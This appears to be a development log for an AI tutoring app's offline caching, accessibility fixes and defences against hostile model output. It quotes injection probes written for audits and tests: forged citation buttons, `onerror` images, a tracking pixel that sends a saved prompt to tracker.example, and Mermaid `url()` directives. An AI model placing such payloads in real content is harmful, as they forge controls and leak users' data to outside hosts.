  rerun: a "what this session covered" recap in 20 s, no false credit).
- An answer from before a three-hour break offered follow-ups, which would
  send it as memory against the divider.
- Edit & reuse, Edit & regenerate and Up arrow on a graded practice answer put
  the grading question in the box as an Explain question, to be sent without
  its rubric. They now reopen the practice card with the answer.
- A long mistake or readiness check produced up to about 3,000 characters and
  On-device Lite cut it off mid-word at 1,800; fields now give way, the
  learner's answer first.
- "?" with focus in Request options or the New topic dialog opened the
  shortcut sheet underneath them and moved focus there, out of sight.
- At 200% text on a 320×640 phone a dock holding a session strip was 768px
  tall and pinned itself over the whole tutor, header included. Past 60% of
  the room above the navigation (not counting the question box's growth) it
  now stays in the page flow, and docks again below 50%.
- Enter with the local-model permission unticked did nothing visible, and a
  send refused at send time failed silently; both now give the reason.
- A reading that failed part-way showed Listen again with no reason; the
  engine's message now shows under the answer (a notice on On-device Lite).
- The quiz dispute note said a miss was "not saved" when it had been saved
  before the check; the disputed path now has a browser regression.

Live `qwen3.5:4b` for the review (8 generations, 393px phone): Explain 50 s
with 16 resolved citations and the topic cue; Give an example 44 s, history
exactly the followed pair (45 and 3,000 characters); then the two failures
above and their reruns (Check my understanding 13 s, Hint 9 s, Wrap up 20 s,
all citations resolved). The first Socratic replies still praised a
"previous answer" the learner never gave, and "Checking citations" never lit
up (#58). The branch was then rebased onto #83 (saved AI output rendered as
untrusted text); the difference from the pre-rebase tip is exactly #83's 22
files. Together they put the precached route screens at 903,321 bytes, over
the 900,000 budget, so the quiz and answer-check views and their styles now
load with the first quiz, as interview practice does (890,629 bytes; the quiz
state and requests stay in the tutor, and screenshots in Paper, Night and
Contrast match the stage-2 ones). Gate on the final tip: `npm run check`
(524 AI/data tests; AI eval 27 cases, hit@1 0.913; startup entry 715,643
bytes; route screens 890,629 bytes) and all 13 `npm run check:browser`
suites on the first attempt (`audit:ai-ui` 109 s, `audit:responsive` 434
layout and 367 control checks, `audit:a11y` 57 axe runs).

Still open: hiding the bottom navigation while typing is implemented
(`useTutorDock`, #93) but unverified on a physical iPhone; a session strip, interview practice and quiz follow-through on
On-device Lite (its docked composer landed with #94 on 2026-09-28); titled
multi-topic threads (designed in
`docs/TUTOR_THREADS_DESIGN.md`); and the server-side Socratic prompt fixes
(#58) seen live: a first reply that praises a "previous answer" the learner
never gave, a hint request answered as "your hint", and a mistake explained
before the learner is asked what went wrong. Below 481px of height, or with
very large text on a small phone, the composer is not docked, so the strip
scrolls with the page there. At 200% text on a 320px phone the tutor title
runs under the header's two 44px buttons, which are the same size as on main.

## Offline route screens reproduced on 2026-09-24

- With the app server stopped, a fresh install that had opened only Home
  replaced the whole app with "Lumen needs fresh app files" on Read, AI Tutor,
  and Settings. Reload showed the same screen. The service worker cached only
  the entry files, so the route chunks were missing until opened online, and
  every update discarded them again. The build now emits
  `offline-routes.json` listing the route screens with their static imports and
  CSS, and install precaches it. That is 19 files and 688,530 bytes beyond the
  908 KB entry. The Node server sends them uncompressed; a gzip host would send
  about 196 KB. KaTeX's JavaScript accounts for 259 KB because the tutor imports
  it directly. Lectures, search data, Mermaid, fonts, and the WebLLM runtime stay
  on demand.
- Install time, from registration to installed, is the median of five fresh
  profiles on a loaded Mac, behind a proxy that shares one link. It went from
  143 to 612 ms on localhost and from 253 to 738 ms at 50 Mbps and 10 ms (home
  Wi-Fi to the Mac). At 10 Mbps and 60 ms it went from 366 to 1,509 ms, and at
  1.6 Mbps and 150 ms from 957 to 4,776 ms. A first visit now transfers
  1,670,479 bytes instead of 973,677. The worker registers after the page's
  load event, so first paint does not change.
- Install now fails, and the working worker stays, when the list comes from
  another build, the HTML boots a different entry, or a file is missing or
  answered with HTML. A failed install deletes only its own unused cache. Two
  partial releases were served over a working one: one missing the Reader chunk,
  one with the previous build's list. Both left the previous release active and
  cached. A complete release installed and waited. The first full browser run
  of this change failed `audit:phone-ai-ui`: its dev-server worker has no build
  query or route list and turned redundant. An unversioned worker now installs
  entry-only.
- "Remove optional offline files" deleted the route chunks too. It now keeps
  every file named by the current build's list and by each cache's installed
  list. A second defect showed up while an update was waiting. The active
  worker answered the list from its cache and then refreshed that copy with the
  new build's list. The second cleanup then removed the active release's route
  screens and its entry script. The worker now neither answers nor caches the
  list at runtime. Two cleanups over a waiting update left the active cache
  complete.
- A screen whose chunk still fails now stays inside the shell. The top bar and
  navigation remain, navigating clears the error, and the message says whether
  the device is offline, the server is unreachable, or the build is incomplete.
  Only the incomplete-build case offers Repair app files. On Wi-Fi with the
  server asleep, chunk recovery reloaded into the same cached failure. It now
  probes `/api/health` first. Storage health has its own boundary, so Settings
  keeps backup export. A lecture that cannot be downloaded now gets a
  plain-language message instead of the dynamic-import error.
- The offline check used `setOfflineMode`, which does not block
  service-worker fetches, and it opened the lecture online first.
  `audit:visual` now starts its own servers and stops them. After a Home-only
  visit, Read, AI Tutor (both engines), Whiteboard, Review, Device evidence, and
  Settings must open. Read mounts the Reader there only because Home loaded
  the first lecture into memory, so the audit also evaluates every route
  screen's module from the cache. A visited lecture must reload. Against the
  foundation build the check reports the fatal screen on Read, AI Tutor, and
  Settings. The main visual pass runs the optional cleanup and asserts that
  the visited lecture is gone and every route file remains. `audit:chunks`
  bypasses the service worker and adds an offline screen, a missing file after
  its one bounded reload, and Settings without Storage health.
- Review found that the server-stopped checks still passed with a worker that
  never answered from Cache Storage. Assets are served `immutable`, and the
  worker's install fetches had filled Chrome's HTTP cache, which answered them
  after the server stopped. The visited-lecture step also navigated to the URL
  it was already on, a same-document fragment change that never reloaded. The
  audit now clears the HTTP cache after each stop, proves the server no longer
  answers, and reloads the lecture. With the same mutated worker it now fails
  on every screen and on the lecture reload.
- Repair app files deleted the caches and then called `update()`, which does
  not reinstall an unchanged worker URL. The route screens stayed uncached
  until the next release: after Repair, AI Tutor with the server stopped showed
  "Lumen's server cannot be reached". Repair could also promote a waiting
  worker whose cache it had just deleted. Repair now unregisters the worker,
  and the reload installs the build again with all 22 listed files; AI Tutor
  then opens offline. `audit:visual` runs the sequence and waits for every
  route file.
- When Home itself failed, the in-shell panel's primary Go to Home did
  nothing because the view did not change. Reload is the primary action there
  now.
- On 2026-09-25, rebased onto the startup-bundle split (#66), `audit:visual`
  failed: after a Home-only visit with the server stopped, Review did not
  render (`Failed to fetch dynamically imported module: …/ReviewCenter-….js`),
  and the module check found the review center, its card editor, the readiness
  check, and the reader's TeX renderer (`markdownMath.js`, now loaded on first
  math) missing from the route list. They are app code, so the list names them
  now: 34 files, 30 of them (773,930 bytes) beyond the 714 KB entry, about
  223 KB gzipped. The split moved code out of the entry into route files, so
  the entry plus route files fell from about 1.60 MB to 1.49 MB. The card
  editor and readiness check render outside the view container; a chunk that
  still fails there reaches the app-level boundary. `audit:app` and
  `audit:visual` now name all four.
- The same rebase kept the in-shell boundary inside the accessibility
  foundation's `<main id="main-content">`. With the network off and both the
  service worker and the HTTP cache bypassed, an ad-hoc check at 393 and
  1280 px found one main landmark with the skip link targeting it, `main`
  inert and `aria-hidden` while Settings was open and restored after it
  closed, Home's heading focused after Go to Home, no console errors, and no
  axe violations on the panel in Paper, Night, or Contrast. A first failure
  renders after route focus has moved to the main landmark, and the panel's
  alert announces it. Returning to the failed screen shows the panel at once,
  and focus lands on its `h1`. `audit:chunks` now asserts the single landmark
  and the return-visit focus; it fails when route focus is mutated to skip the
  panel's heading.

## Bugs reproduced on 2026-09-24: review center and notebook

Review center, readiness check, and notebook (issue #54):

- Importing a `lumen.cards.v1` deck threw `ReferenceError: onImportCards is
  not defined`; nothing was imported and no message appeared. Import is now a
  keyboard-operable button wired to the handler. The review audit imports a
  deck by keyboard, then re-imports it and a malformed file to check the
  duplicate and error messages.
- After "Show answer", all four grade buttons sat under the bottom navigation
  at 375×667 and 320×640. The grading panel now sticks above the navigation;
  the audit checks each button is visible and hit-testable at 375×667.
- Home showed three due counts for one deck because archived and buried cards
  were counted. Home, the sidebar badge, and the app badge now use the review
  queue's count.
- Focus fell to `<body>` after starting, revealing, grading, archiving, and
  deleting, and after each readiness answer; grades were not announced; the
  progress bar showed 1/remaining. Focus now follows the prompt, answer,
  question, or result, grades are announced, and the bar reports graded/total.
- Deleting a mistake or clipping was instant and final, and a scrim tap or
  Escape discarded a readiness check's answers. Deletions offer Undo, and a
  check in progress asks before closing.
- Burst typing into a clipping note with two clippings dropped a character and
  raised React error #185. The note now buffers keystrokes and commits after a
  pause, on blur, or when the page is hidden.
- Review and dialog fields were 10–12.5px, so iOS zoomed on focus; notebook
  rows cut titles to four characters at 320px; the FSRS Daily limits strip
  collapsed to one letter per line at 768–1100px. Fields are 16px on phones,
  row actions sit under the title, and the strip wraps.

Review of the fix branch caught two regressions of its own, each first
reproduced against the preceding build and now covered by the review audit:
the Daily limits labels broke one letter per line on every phone width (in the
default scheduler too), and a focused Undo strip expired once the pointer had
passed over it, dropping focus to `<body>`. At 200% text the grade buttons now
fall back to two columns and stay clear of the taller bottom navigation.

A second review reproduced two more against the preceding build. The Undo
strip rendered at the top of its section, so after deleting a mistake or
clipping further down the list it sat off screen while holding focus; it now
takes the deleted entry's place and scrolls into view clear of the top bar
and bottom navigation. Ending a crunch practice session left crunch mode on,
so the hero counted the weak-card practice pool (5) instead of today's queue
(2); crunch mode now ends with its session. The review audit covers both,
plus archive focus handoff and Enter-to-submit in an all-cloze readiness check.

After rebasing onto the accessibility foundation, the mistake dialog's own
inert handling and the App's modal flag could undo each other. With the dialog
open, `?` opened the shortcut sheet over it; closing the sheet removed `inert`
from the top bar, `#main-content`, and the bottom navigation while the mistake
dialog was still open. The dialog now joins the App modal flag, so the shell
stays inert until every modal closes. The review audit opens and closes the
shortcut sheet over the dialog and checks that the shell stays inert; that
check fails against the previous mechanism. It also checks that closing the
dialog returns focus to Log mistake. With the sheet on top, Escape used to
close both dialogs and discard the mistake draft. A trial move to the shared
`useModalDialog` hook also let Tab in the sheet pull focus behind it, so that
change was reverted. The dialog keeps its own key handling and ignores keys
while focus is in a dialog stacked over it. The audit presses Tab and Escape
in the sheet: focus stays in the sheet, and Escape closes only the sheet.

The gate's axe run sees only a fresh profile. An axe pass over populated
review screens in all three themes found low-contrast mistake chips (4.23:1
and 2.86:1 in Paper), a low-contrast Show answer hint (2.12:1 in Night), and
practice views with no level-one heading. All three are fixed. The
`<form role="dialog">` markup (`aria-allowed-role`) is shared with the App's
dialogs and remains open.

The first browser gate on the rebased branch failed twice. At 360px with
200% text, the session header's Undo button extended to 397px. The branch
keeps the header buttons on one line, and the count between them had shrunk
only because `overflow-wrap: anywhere` split "remaining" mid-word; the
foundation removed that. The count now fills the space between the buttons
and wraps between words. The header wraps to two rows only at large text and
stays on one line from 320px at normal size. The review audit also pressed
Enter on Import one frame before a card deletion moved focus to the next row,
so Enter opened the card editor instead of the file picker. The audit now
waits for that focus move. The crunch-practice notice now uses the
`--ai-warn` text token; its hard-coded amber measured 3.9–4.3:1.

## Bugs reproduced on 2026-09-25: forged tutor citation controls (#69)

The tutor rendered model output through marked, which passes raw HTML
through, and DOMPurify's default profile, which keeps `<button>` and
`data-*`. Against the preceding build, `audit:ai-ui` mocked an answer
containing `<button class="ai-tutor__citation" data-ai-citation="S2">Open the
forged source</button>`. It rendered as a real button, next to a forged
`<span>` and `<a>` that also carried `data-ai-citation`, and clicking it
opened `#/read/notes/part-02-mathematics/06-experiments-and-information.md`.
No `[S#]` marker produced that control, so the citation validator never saw
it. The phone fixture answer showed the same control on On-device Lite.

- Raw HTML in tutor prose and structured fields now renders as text on both
  engines. Citation buttons and web links are created by the renderer from
  `[S#]`/`[W#]` markers outside code. A bare `<br>` is the only model HTML
  kept, so table cells can still break lines.
- A quote in a link title or a code-fence language used to add attributes to
  the tutor markup, `data-ai-citation` and `style` included. Both are escaped
  now, and link labels are parsed Markdown instead of raw text.
- `audit:ai-ui` expects the forged button, span, anchor and `onerror` image
  as visible text, one citation control (the renderer's `[S#]` button), a
  plain paragraph under the forged label, and no navigation after a mouse
  click there. Against the preceding build it fails with four
  `data-ai-citation` elements. `audit:phone-ai-ui` checks the same for a
  forged button in the phone answer.
- Unit tests in `tutorMarkdown.test.mjs` and `phoneTutorMarkdown.test.mjs`
  run on the renderer output before DOMPurify, which needs a DOM. They cover
  forged buttons, `data-ai-*` on other elements, scripts, frames, event
  handlers, forms, link labels and titles, fence info strings, raw-text tags
  and structured fields, and that citations, math, code, tables and Mermaid
  source still render. Fourteen legitimate answers, the audit and fixture
  answers among them, render byte-identical markup before and after.

The Reader's renderer is unchanged. AI answers saved to notes and AI
flashcards added to the deck render there, where author HTML goes to
DOMPurify and link titles and fence languages are still unescaped. Those
screens have no citation handler; the gap remains open.

### Adversarial review of the #69 fix (2026-09-25)

Raw HTML, entities, SVG and MathML, forms, autolinks, link titles, image
alt text, tables, lists, blockquotes, KaTeX `\href`/`\htmlData` and
Mermaid labels, directives and theme CSS all stayed inert. Three paths
still led somewhere the evidence did not:

- A model could wrap a verified citation in its own link:
  `[[S1]](#/read/notes/forged-phone-route)`. Chrome follows an `<a>` when a
  `<button>` inside it is clicked, and the phone handler did not prevent
  that, so `audit:phone-ai-ui` recorded the S1 source navigation and then
  the hash moving to `#/read/notes/forged-phone-route`. On the Mac,
  `preventDefault` stopped a plain click, but the chip still sat inside a
  link to the model's URL for middle-click and open-in-new-tab. A label
  that shows a citation marker now renders without its link (entities,
  full-width forms and zero-width characters count), and the phone handler
  prevents the default action like the Mac's.
- A Markdown link to an app route, `[Open the lecture](#/read/notes/…)`,
  was a working link that opened a note no citation validated. Tutor links
  now keep only `http(s)` and `mailto` targets; relative, root, `//` and
  `#` links render as their label.
- The Mermaid SVG filter kept any `href` starting with `#`, so a `click`
  line to `#/read/…` would become a working diagram link. Mermaid 11.17
  leaves the `xlink` prefix undeclared, so those diagrams fail to parse
  today; the filter now drops every diagram link target and keeps `<use>`
  references. No lecture uses a Mermaid `click` line.

Image alt text also showed citation button markup (`alt="see <button …"`);
it now shows the marker. `audit:ai-ui` adds a wrapped citation and an app
route link to the forged answer and expects two renderer `[S#]` buttons, no
links, and no navigation after a click on the route label.
`audit:phone-ai-ui` clicks the wrapped `[S1]` and fails against the
previous build when the hash moves. `audit:mermaid` renders a well-formed
linked SVG through a stand-in Mermaid and fails when a link target
survives. Removing either link check or the image override fails the unit
tests.

## Bugs reproduced on 2026-09-25: saved AI output trusted outside the tutor (#81)

The security review of #69 named three paths where model text was trusted
more than the tutor trusts it. Against main (3020ab0), with the new audits
and a seeded probe:

- Review rendered AI flashcards, and cards made from an AI clipping, through
  the Reader's renderer. A seeded AI flashcard whose answer held
  `<button class="ai-tutor__citation" data-ai-citation="S1">`, `<img
  src="https://tracker.example/raw.png">`, `![Tracking
  pixel](https://tracker.example/pixel.png?q=saved-prompt)` and a link to
  `http://127.0.0.1:<port>/#/read/notes/…` rendered a real citation button,
  two `<img>` elements and a live link into the app. The deck page sent 16
  requests to tracker.example in 1.5 s. `audit:review` fails there with
  "AI flashcard in the deck: saved AI text rendered an <img>".
- "Create review card" on an AI clipping dropped its provenance: the card
  got the answer text and only a `part-N` tag.
- A Markdown image in a tutor answer rendered as an `<img>` and loaded
  (`img-src https:`).
- `[Open the app copy](http://127.0.0.1:<port>/#/read/…)` in a tutor answer
  was a live link. `audit:ai-ui` fails with the links
  `["http://127.0.0.1:58983/#/read/notes/…"]` where it expects only the image
  link. The http(s) check also passed `[x](http:#/read/notes/x)`, which a
  browser resolves against the page to an in-app route.

The Notebook already showed a saved answer as plain React text; it stays
that way and the audits now assert it.

- The tutor's untrusted rules move to `src/lib/untrustedMarkdown.js`, which
  does not import KaTeX. The tutor renderer adds citations, KaTeX and its
  layout on top. `renderUntrustedMarkdown` applies the rules alone to saved
  AI output; its `[S#]`/`[W#]` markers stay plain text because no evidence
  travels with saved text.
- A remote Markdown image renders as a link, "Image: alt (host)", that opens
  in a new tab. Relative, `data:` and same-host images and images labelled
  with a citation marker show their alt text. A linked image becomes the
  link's text, so links never nest.
- A link to the app's own host (any scheme or port, absolute or autolinked)
  renders as its label. Kept links carry the normalized address, and
  addresses with credentials render as text.
- Review renders a card with the untrusted profile when it carries the
  `ai-draft` tag or was made from an `ai-tutor` clipping: in the deck, review
  sessions, interview rounds and the card dialog's preview. A card made from
  an AI clipping gets `ai-draft` (first, so a tag limit cannot drop it), the
  dialog says it is an AI draft, and an edit that clears the tags keeps it.
  A card made from an AI clipping before this change gains the tag when the
  profile loads (see the review follow-up below). Learner cards keep the
  Reader renderer. No schema field was added.
- No path opens saved AI text in the Reader: "Save to notes" writes a
  clipping, whose button opens the cited lecture, and notes are created only
  by the learner. The Reader is unchanged.

Evidence:

- Unit tests (`untrustedMarkdown.test.mjs`, `tutorMarkdown.test.mjs`,
  `phoneTutorMarkdown.test.mjs`, `aiProvenance.test.mjs`) cover the hostile
  saved answer, citation-looking links, images (remote, reference, linked,
  relative, `data:`, same-host, in tables and structured fields, KaTeX
  `\includegraphics`), same-host links (absolute, autolinked, other port,
  numeric host, `http:#…`), the page-origin default, Markdown structure in
  saved text, the Reader renderer still keeping author HTML and images, and
  provenance through normalization, backup and a 40-tag card. Each of these
  mutations fails at least one test: removing the image override, the
  same-host check, the address normalization, the URL parse, the
  citation-label check or the nested-image flattening; turning the html
  tokenizers back on; dropping the clipping clause from the AI-card check;
  appending `ai-draft` last.
- `audit:ai-ui` saves a hostile answer to notes, makes a review card from
  the clipping (checking the `ai-draft` tag, the AI note and the preview),
  adds hostile AI flashcards to Review, and checks the tutor answer, the tutor
  flashcard, the Notebook clipping and both deck cards: no `<img>`, no
  control, no link to the app, the image as a link, the markup as text, and
  no request to the image host.
- `audit:review` seeds an AI flashcard, a pre-tag card from an AI clipping,
  the clipping and a learner card in a fresh context, then checks the deck,
  every card of a session, an interview round, both edit previews, that
  clearing the tags keeps `ai-draft`, the Notebook clipping, a learner card's
  `<kbd>`, and no request to the image host.
- Both audits fail against main's app sources, as described above.
- KaTeX `\includegraphics`, `\href` and `\htmlStyle` render no image, link
  or style with trust off. Mermaid did fetch; see the review follow-up below.
- Startup script: 712,278 bytes (main 711,759). Route screens beyond the
  entry: 816,191 bytes (main 814,352).
- Gate: `npm run check` passed (`audit:ai` 453/453). `npm run check:browser`
  passed all 13 suites on the first attempt with no retries. One earlier
  standalone `audit:review` run timed out waiting for the deck-import file
  chooser, before the new section; the rerun and the gate passed.

### Adversarial review of the #81 fix (2026-09-25)

The review tried to get model HTML, forged controls, remote fetches or
same-origin navigation through every storage and render path: save to notes
and the Notebook clipping, a backup round trip, a `lumen.cards.v1` export and
import, sync merge, clipping-note edits, the card dialog preview, AI
flashcard answers, mistakes and corrective cards, protocol tricks (`HTTP:`,
`//`, `http:\\`, `http:/`, `http:host`, entity-encoded schemes, spaces,
tabs, user info, trailing dots, numeric and hex IPv4 forms, ports, `[::1]`,
`xn--` names), `<picture>`/`srcset`, CSS `url()` in `style`, and KaTeX
`\href`, `\url`, `\includegraphics`, `\htmlStyle` and `\color{url(…)}`. The
Markdown renderer held: all of these came out as text, as a normalized
external link, or as a KaTeX error in a `title`. Two defects remained.

- **Mermaid diagrams in tutor answers fetched remote resources.** The first
  version of this fix recorded that Chrome sent no request for a `themeCSS`
  `url()`; that was wrong. A probe that rendered
  tutor answers through `renderTutorMarkdown` and `useMermaidDiagrams` in
  Chrome recorded requests to tracker.example from:
  - a `%%{init: {"fontFamily": "x;background-image:url(…)"}}%%` directive;
  - `themeCSS` with selectors (`rect{background-image:url(…)}`);
  - a frontmatter `config: fontFamily`;
  - an `htmlLabels: true` directive with an `<img>` label (loaded while
    Mermaid measured it; the SVG filter removes `foreignObject` only
    afterwards);
  - a flowchart node's `@{ img: "…" }` (Mermaid preloads it with
    `new Image()`);
  - a sequence actor's `properties` `icon`;
  - a `stateDiagram-v2` `classDef … mask-image:url(…)`.

  Flowchart `style`/`classDef` lines with `url()` fail to parse; state
  diagram `classDef` lines do not. A directive without an address could
  still restyle the diagram: `fontFamily: "x;position:fixed;…"` reaches the
  SVG's `<style>`, and `htmlLabels` loads a same-origin `<img>`.
- **Pre-#81 cards made from AI clippings lost provenance.** Such a card was
  recognized only through its clipping id. A card export (which carries
  tags but not `sourceClippingId`), a mistake it logged (and the corrective
  card made from it after the card was deleted), or deleting the clipping
  all left AI text rendering as trusted.

Fixes:

- The untrusted profile marks a model diagram with
  `data-diagram-author="model"`. For such a diagram, `renderMermaidDiagrams`
  calls `mermaid.initialize` with every top-level config key in `secure`.
  Mermaid then drops each directive and frontmatter `config:` key before
  applying it, so the site's font, `htmlLabels: false` and theme stay. A
  model diagram whose source, after numeric entities (`&#58;`, Mermaid's
  `#58;`) are decoded and tabs and line breaks removed, contains a web
  scheme, `//`, a backslash (YAML, JSON and CSS escapes all need one),
  `url(`, `image-set` or `@import` is shown as a `mermaid` code block. A
  marked diagram that reaches Mermaid without passing through the profile
  fails with "Diagram not drawn". Learner diagrams in the Reader keep their
  directives.
- The profile normalizer adds `ai-draft` (first, within the 30-tag limit)
  to a card whose `sourceClippingId` names an `ai-tutor` clipping.
  Normalizing again changes nothing, and sync normalizes base, local and
  remote alike, so the backfill does not look like an edit.

Evidence:

- `audit:mermaid` has a `resources` fixture. It renders nine address-naming
  tutor diagrams (including a YAML-escaped `"i\x6dg"` key and a CSS-escaped
  `u\72l(…)`), a saved-AI diagram, three directive-only tutor diagrams
  (overlay font, `htmlLabels` with a same-origin `<img>`, red `themeCSS`
  fill), a learner diagram with the same red fill, and marked model markup.
  It asserts no request to tracker.example, no same-origin label request,
  ten code blocks and no drawn diagram for the address-naming ones, no red
  fill, `position: fixed` or HTML label in the directive diagrams, the site
  font, a red fill in the learner diagram and "Diagram not drawn" for the
  marked markup. Against the branch's previous renderer and Mermaid module
  (the same as main for Mermaid) it fails with 11 requests: `/font-family`,
  `/theme-css`, `/frontmatter`, `/html-label`, `/shape-image`,
  `/actor-icon`, `/class-def`, `/yaml-escape`, `/css-escape`,
  `/saved-shape`, `/marked-markup`. With only the config lock removed, it
  fails with the same-origin label request.
- Unit tests cover the address check in 13 spellings and 4 ordinary
  diagrams, the locked config, model fences shown as code in the saved-AI
  and tutor renderers, the model marker, and Reader diagrams staying
  unmarked and drawn. Each of 10 mutations fails at least one test: the
  renderer ignoring the check, backslash, decimal or hex entity decoding,
  tab removal or schemes dropped from the check, the model marker dropped,
  the config not locked, Mermaid's default keys ignored, and the code
  fallback ignored.
- `aiProvenance.test.mjs` normalizes a pre-#81 card, a 30-tag one, a learner
  clipping's card and an unlinked card. It then deletes the clipping,
  exports and imports the deck, and logs a mistake that makes a corrective
  card. The backfill fails the test when it is removed or when it appends
  the tag last. `audit:review` asserts that the seeded pre-#81 card shows
  `ai-draft` in the deck before any edit.
- Kept as they are: a `lumen.cards.v1` file is learner-chosen content, like
  an uploaded note, so its cards render with the Reader renderer unless they
  carry `ai-draft`. Exported AI cards keep the tag (first, within the
  importer's 10-tag limit). `[W#]` citation links come from fetched search
  evidence, not model text.
- Startup script: 713,759 bytes (budget 750,000). Route screens beyond the
  entry: 816,282 bytes.
- Gate: `npm run check` passed (`audit:ai` 459/459). `npm run check:browser`
  passed all 13 suites on the first attempt with no retries.

## Bugs reproduced on 2026-09-25: tutor session framing (#82)

Endpoint probes streamed tutor requests through the real browser client
(`requestAiStream`, `fitTutorRequest` and the tutor's own action builders)
into a freshly started integrated server (`startApplicationServer`, the
`.env` values with loopback overrides and `AI_AUTH=open`) and the local
`qwen3.5:4b`. "Before" is main (1f6dcaf, same AI code as 87ad04d); "after"
is this branch. Each scenario ran once unless a count is given. The topic was
ridge regression, with 8 library passages retrieved per request.

| Scenario | Before (main) | After (this branch) |
| --- | --- | --- |
| Session start (Socratic mode prompt) | "Your previous assessment correctly identified that Ridge regression applies an L2 penalty…" before any question (7.4 s) | One cited question with no praise, 4 of 4 runs (2.9–8.7 s). Framing `open`. |
| Session start after an explanation | "Your explanation correctly identifies…" (4.5 s) | One cited question (9.6 s) |
| Check my understanding | "Your answer correctly identifies that Ridge regression shrinks coefficients…" (5.7 s) | One cited question (4.1 s) |
| Hint | "Your hint correctly identifies that the L2 penalty shrinks weights…", then a new question (4.8 s) | 6 of 6 gave one cited hint and "Try answering your previous question again", with no praise and no new question (1.4–9.4 s). Framing `hint`. |
| Next question after a reveal | "Your assessment that Ridge shrinks weights continuously… is correct" (9.0 s) | One cited question (8.5 s). Framing `open`. |
| Worked-through mistake | "Your answer contains a fundamental misconception: Ridge regression does **not** set coefficients to exactly zero…", then a geometric explanation (247 tokens, 8.7 s) | 6 of 6 asked one diagnostic question and nothing else, e.g. "When you said ridge regression sets coefficients to exactly zero, what part of your reasoning led you to that conclusion? [S1]" (27–33 tokens, 0.9–8.3 s). None stated or hinted at the expected answer. Framing `diagnose`. |
| Reply to the diagnostic question | Assessed, then asked (9.3 s) | "Your answer is a **misconception** because you described the behavior of Lasso…", then one question (5.0 s). Framing `answer`: the explanation comes after the learner replies. |
| Answer to the tutor's question | "Your understanding is partly correct…" (6.3 s) | Assessed as a misconception with the reason, then one question, 3 of 3 (4.3–10.1 s). Framing `answer`. |
| Answer after a hint | "Your assessment is correct…" (8.2 s) | "Your understanding is correct…", then one question, 2 of 2 (2.5–8.2 s). Framing `answer`. |
| Reveal (Explain task) | Step-by-step answer (17.2 s, 519 tokens) | Step-by-step answer (24.1 s, 569 tokens). Reveals get no Socratic framing. |
| Wrap-up (Summarize task, no sources) | Recap that credits nothing (15.2 s) | Recap with "What I revealed" that credits nothing (19.0 s). No Socratic framing. |
| Grounded Explain, stream | `validating` ("Checking completion and grounding before finalizing the answer.") at 9,880 ms, reported after the check had passed; first delta at 9,880 ms | Order `start > approach > preparing > generating > validating > delta > complete`. `validating` ("Checking the answer's citations against the supplied sources.") at 9,302 ms, reported before the check; first delta at 9,302 ms |
| Grounded Explain, JSON | 10.8 s | 14.4 s. The response keys did not change. |

- The Socratic task instruction told the model to assess "when the learner
  has just answered your previous question", on every Socratic turn. The
  4B model applied it to turns where the learner had answered nothing. The
  server now chooses one framing per turn, so the model never gets that
  condition.
  - `diagnose`: the message opens with "Work through this mistake".
  - `hint`: the message asks for a "hint for your last question".
  - `open`: the message says "I have not answered", or does not follow a
    question from the tutor.
  - `answer`: the tutor's last turn ends by asking a question (a closing
    sentence that opens as an offer, such as "Want to see an example?", or
    with "Does that make sense?" does not count), the learner is trying
    again after a hint, or the message answers a question it quotes
    (`My answer: …`).
- The tutor's action prompts now say it in words: the Socratic mode prompt,
  the lesson starters, Check my understanding, Hint and Next question all say
  "I have not answered…". The notebook bridge asks the tutor to first ask
  what went wrong and not to explain until the learner replies. Wording saved
  in older conversations still maps to the same framing and still does not
  count as an answer in a session.
- The first version of the rule looked at the tutor turn's last paragraph.
  But the client's conversation window collapses whitespace, and ordinary
  sends keep `[S#]` labels. So a question whose label sat on its own line,
  or a hint turn ending "Try answering your previous question again", would
  not have counted as a question. The rule now reads the history as the
  client sends it: code and labels are removed, and the text must end with a
  question. A reply after a hint is always an answer. The deterministic tests
  build each request through `tutorConversationWindow`.
- Remaining model limits: 4 of 6 hints stated most of the mechanism ("the
  smooth curvature of the L2 ball prevents this exact alignment") even
  though the prompt says not to reveal the answer. A fifth came close. Three
  of the four session starts stated the ridge and lasso contrast before
  asking about it.
- Checking citations was never shown. The server reported `validating` only
  after a grounded draft passed, never for a failed draft and never on the
  JSON transport. It also came in the same read as the held answer and
  `complete`, so the step was never drawn. Both transports now report
  `validating` before each terminal draft is checked. A draft that fails its
  check returns to `generating` and is checked again, bounded by the
  one-shot recoveries.
- The check takes milliseconds, so the server-side gap is still about
  0 ms. The fix that makes the step visible is on the client. The tutor
  waits 300 ms on a `validating` event while its step list is visible (not
  on a hidden page; Stop ends the wait). `requestAiStream` stops with
  `AI_CANCELLED` or `AI_CLIENT_TIMEOUT` if the request ended during that
  wait, instead of applying the buffered answer. Each step is announced once
  per answer, even when a failed draft makes the tutor go through Drafting
  and Checking twice.
- Live UI in headless Chrome at 393 px, with each server and the real model:

  | Question | Main | This branch |
  | --- | --- | --- |
  | "Explain the bias-variance trade-off in ridge regression, in under 150 words." | Checking citations never drawn; not announced (11.7 s) | Drawn for 18 frames (283 ms) with the server's message; "Checking citations…" announced once (17.1 s) |
  | "Why must a final holdout set stay untouched until the end of model development?" | Drawn for 1 frame (0 ms); not announced (23.5 s) | Drawn for 18 frames (283 ms); announced once (46.0 s, 1,195 tokens) |

Evidence:

- `server/ai/quality.test.mjs` pins the framing of 25 tutor turns, before
  and after the server's own request validation. Each turn
  is built by the client's own builders (Socratic mode prompt, lesson
  starter, Check my understanding, Hint, Next question, notebook bridge,
  answer-check draft), including their older wording. It also pins each
  framing's system and format text, and the absence of any assessment
  wording on turns without an answer. It also pins that reveals and
  wrap-ups get no Socratic framing, that a hint's grounding repair asks for
  a cited hint, and the phase order on both transports: grounded, failed
  then regenerated, failed twice (never released, `validating` twice),
  structured and source-free. A final test checks the real stream endpoint's
  event order and that the JSON envelope keys did not change.
- Client tests pin the action prompts, the earlier wording still being
  recognized, the 300 ms hold rule, and a Stop during the hold beating the
  answer and `complete` buffered behind it.
- `audit:ai-ui` checks that the requests of a real Socratic session, hint,
  next question, notebook bridge and answer check get their framing. It also
  sends a tutor question to the integrated server's own stream, in front of
  a scripted Ollama, delivered in one piece. "Checking citations" must be
  drawn for at least 2 frames, come from that `validating` event, show
  before the answer, and be announced exactly once.
- Mutations: with the hold removed, `audit:ai-ui` fails with "Checking
  citations was never on screen". With `validating` moved back after the
  check, 6 stream tests fail. Without the after-hint rule, 2 framing tests
  fail. With the paragraph rule restored, 3 fail. With offer phrases matched
  anywhere in the closing sentence, 2 fail: "which quantity do you want to
  minimize?" was treated as an offer, so the answer to it went unassessed.
  An earlier draft of this branch had that bug; offers now count only at the
  start of the sentence.
